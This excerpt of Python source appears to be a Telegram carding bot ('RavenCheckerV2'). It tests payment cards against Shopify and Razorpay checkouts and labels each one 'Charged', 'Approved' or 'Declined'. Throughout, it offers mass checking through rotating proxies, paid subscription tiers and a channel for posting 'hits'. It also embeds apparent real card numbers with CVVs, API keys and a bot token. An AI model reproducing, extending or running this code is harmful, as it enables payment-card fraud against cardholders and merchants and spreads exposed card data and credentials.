...
API_ID = int(os.getenv("API_ID", "30919664"))
API_HASH = os.getenv("API_HASH", "728958a80f9e4d36a499020e954adf15")
BOT_TOKEN = os.getenv("BOT_TOKEN", "8471637595:AAEcOZDEmCf8TRZSV9GbyY34OSHg3aFyWOs")

ADMIN_ID = [int(x) for x in os.getenv("ADMIN_ID", "6778434153").split(",")]
HIT_CHANNEL_ID = int(os.getenv("HIT_CHANNEL_ID", "-1004294038729"))
JOIN_GROUP_ID = int(os.getenv("JOIN_GROUP_ID", "-1004294038729"))
JOIN_CHANNEL_ID = int(os.getenv("JOIN_CHANNEL_ID", "-1004294038729"))
JOIN_GROUP_LINK = os.getenv("JOIN_GROUP_LINK", "https://t.me/RavenCheckerV2")
JOIN_CHANNEL_LINK = os.getenv("JOIN_CHANNEL_LINK", "https://t.me/RavenCheckerV2")
FORCE_JOIN_IMAGES = []
...
PENDING_PROXY_SELECTION = {}  # {user_id: {"type": "sp"/"msp"/"rz"/"mrz", ...}}
...
# ====================== NEW SHOPIFY API ======================
SHOPIFY_TEST_CARD = "4232233044859550|09|28|980"

def classify_shopify_response(data: dict) -> dict:
    resp = data.get("Response", "")
    resp_upper = resp.upper().strip()
    price = data.get("Price", "-")
    gateway = "Shopify"

    if resp_upper == "ORDER_PLACED":
        return {"Response": resp, "Price": price, "Gateway": gateway, "Status": "Charged"}
    elif resp_upper in ("INSUFFICIENT_FUNDS", "INCORRECT_CVC", "OTP_REQUIRED"):
        return {"Response": resp, "Price": price, "Gateway": gateway, "Status": "Approved"}
    elif resp_upper == "CARD_DECLINED" or "DECLINED" in resp_upper:
        return {"Response": resp, "Price": price, "Gateway": gateway, "Status": "Declined"}
    else:
        return {"Response": resp, "Price": price, "Gateway": gateway, "Status": "Declined"}
...
async def check_shopify_api(card, site, proxy_data=None, user_id=None, http_session=None):
    ...
    try:
        ...
        async with s.get(SHOPIFY_API_URL, params=params, timeout=aiohttp.ClientTimeout(total=API_TIMEOUT)) as r:
            if r.status != 200:
                return {"Response": f"HTTP_{r.status}", "Price": "-", "Gateway": "Shopify", "Status": "SiteError", "card": card, "site": site}
            data = await r.json(content_type=None)
            result = classify_shopify_response(data)
            result["card"] = card
            result["site"] = site
            return result
    except asyncio.TimeoutError:
        ...
        err = str(e)
        return {"Response": err[:100], "Price": "-", "Gateway": "Shopify", "Status": "SiteError", "card": card, "site": site}
...
async def test_shopify_site(site, proxy_data=None, http_session=None):
    try:
        result = await check_shopify_api(SHOPIFY_TEST_CARD, site, proxy_data, user_id=0, http_session=http_session)
        if result.get("Status") not in ("SiteError", "Error"):
...
# ====================== NEW RAZORPAY API ======================
RAZORPAY_TEST_CARD = "4985032058943790|07|27|195"

def classify_razorpay_response(data: dict) -> dict:
    resp = data.get("Response", "")
    code = data.get("Code", "")
    gateway = "RazorPay"
    resp_lower = resp.lower()

    if "transaction success" in resp_lower:
        return {"Response": resp, "Price": "-", "Gateway": gateway, "Status": "Charged"}
    
    approved_keywords = [
        "insufficient balance", "incorrect cvv", "cvv is incorrect",
        "3ds", "authentication", "otp", "could not be completed due to insufficient"
    ]
    if any(kw in resp_lower for kw in approved_keywords):
        return {"Response": resp, "Price": "-", "Gateway": gateway, "Status": "Approved"}
    
    if "payment declined" in resp_lower or code == "payment_risk_check_failed":
        return {"Response": resp, "Price": "-", "Gateway": gateway, "Status": "Declined"}
    
    return {"Response": resp, "Price": "-", "Gateway": gateway, "Status": "Declined"}

async def check_razorpay_api(card, site=None, proxy_data=None, user_id=None, http_session=None):
    uid = user_id or "?"
    params = {"cc": card, "amount": "1"}
    if site:
        params["url"] = site
    if proxy_data:
        proxy_str = f"{proxy_data['ip']}:{proxy_data['port']}"
    ...
    try:
        ...
        async with s.get(RAZORPAY_API_URL, params=params, timeout=aiohttp.ClientTimeout(total=RZ_TIMEOUT)) as r:
            if r.status != 200:
...
async def test_razorpay_site(site, proxy_data=None, http_session=None):
    try:
        result = await check_razorpay_api(RAZORPAY_TEST_CARD, site, proxy_data, user_id=0, http_session=http_session)
        if result.get("Status") not in ("RetryError", "Error"):
            return {'site': site, 'status': 'alive', 'price': '-', 'response': result.get('Response', '')[:100]}
        else:
            return {'site': site, 'status': 'dead', 'price': '-', 'response': result.get('Response', '')[:100]}
    except Exception as e:
...
async def add_shopify_sites_file(event):
    ...
    if not reply or not reply.document:
        return await styled_reply(event, f"{PE} {bs('Reply to a .txt file with sites')}", emoji_ids=[CE["info"]])
    try:
    ...
    for i, site in enumerate(sites):
        ...
        await styled_edit(status_msg, f"{PE} 🔄 {bs('Validating')}...\n{bar}\n✅ {len(valid)} ❌ {len(invalid)}", emoji_ids=[CE["fire"]])
    added = 0
    for site in valid:
        if await add_shopify_site_db(event.sender_id, site):
            added += 1
...
async def single_cc_check_shopify(event):
    ...
    if proxies and (is_paid_plan(plan) or uid in ADMIN_ID):
        ...
        return
    await _execute_sp_check(uid, card, sites, [], plan, is_group, event)
...
async def single_cc_check_razorpay(event):
    ...
    if proxies and (is_paid_plan(plan) or uid in ADMIN_ID):
        ...
        await styled_reply(event, f"{PE} <b>{bs('Proxy Selection')}</b>\n{bs('Use a proxy for this check?')}", buttons=buttons, emoji_ids=[CE["shield"]])
        return
    await _execute_rz_check(uid, card, sites, [], plan, is_group, event)
...
async def chk_pref_callback(event):
    ...
    async def shopify_mass_check(card, http_session):
        result, _ = await check_shopify_with_retry(
    ...
    ACTIVE_MTXT_PROCESSES[uid] = {"stopped": False, "tasks": []}
    asyncio.create_task(_run_mass_process(
        event_obj, cards, proxies, send_approved, ACTIVE_MTXT_PROCESSES,
        "stop_chk", shopify_mass_check, "Shopify", "msp"
    ))

@client.on(events.CallbackQuery(pattern=rb"mrz_pref:(yes|no):(\d+)"))
async def mrz_pref_callback(event):
    send_approved = event.pattern_match.group(1).decode() == "yes"
    uid = int(event.pattern_match.group(2).decode())
    if event.sender_id != uid:
        return await event.answer(f"{bs('Not yours')}!", alert=True)
    ...
    async def razorpay_mass_check(card, http_session):
        return await check_razorpay_with_retry(
            card, sites, uid, proxies, 3, rotator,
            cancel_check=lambda: ACTIVE_MRZ_PROCESSES.get(uid, {}).get("stopped", True),
            http_session=http_session
        )
    
    ACTIVE_MRZ_PROCESSES[uid] = {"stopped": False, "tasks": []}
    asyncio.create_task(_run_mass_process(
        event_obj, cards, proxies, send_approved, ACTIVE_MRZ_PROCESSES,
        "stop_mrz", razorpay_mass_check, "RazorPay", "mrz"
    ))
...
async def _handle_plan_assign(event, plan_key):
    ...
    pi = PLANS[plan_key]
    try: target_entity = await client.get_entity(target_uid); target_name = getattr(target_entity, 'first_name', None) or "Unknown"
...
async def rplan_cmd(event):
    ...
    try: ent = await client.get_entity(target_uid); tn = getattr(ent, 'first_name', None) or "?"
    except: tn = "?"
...
async def fuck_command(event):
    if event.sender_id not in ADMIN_ID:
        return
    api_url = SHOPIFY_API_URL.replace("/sh", "/admin/fuck")  # adjust if needed
    try:
